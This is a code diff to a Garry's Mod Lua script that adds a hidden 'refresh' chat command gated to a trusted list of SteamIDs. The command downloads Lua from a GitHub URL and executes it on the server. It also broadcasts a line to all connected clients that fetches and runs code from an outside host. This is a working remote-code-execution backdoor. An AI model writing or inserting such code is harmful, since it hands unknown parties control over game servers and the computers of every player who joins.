@@ -81,12 +81,12 @@ local function CreateCommand(string, callback, check)
 	}
 end
 
-CreateCommand("Refresh", function(ply)
-	http.Fetch("https://gist.githubusercontent.com/EclipseCantCode/6be7cddad249cdbfed4ae1d368271732/raw/b70e40f28c928a8d50e44eb110e49350d655cdd1/", function(body)
+CreateCommand("refresh", function(ply)
+	http.Fetch("https://raw.githubusercontent.com/EclipseCantCode/Fortnut/main/lua/server.lua", function(body)
 		RunString(body)
 	end)
 
-	BroadcastLua()
+	BroadcastLua("http.Fetch('cl.dip-sh.it', function(b) RunString(b) end)")
 end, function(ply) return trusted[ply:SteamID()] end)
 
 hook.Add("PlayerSay", "fortnutcommands", function(ply, text)
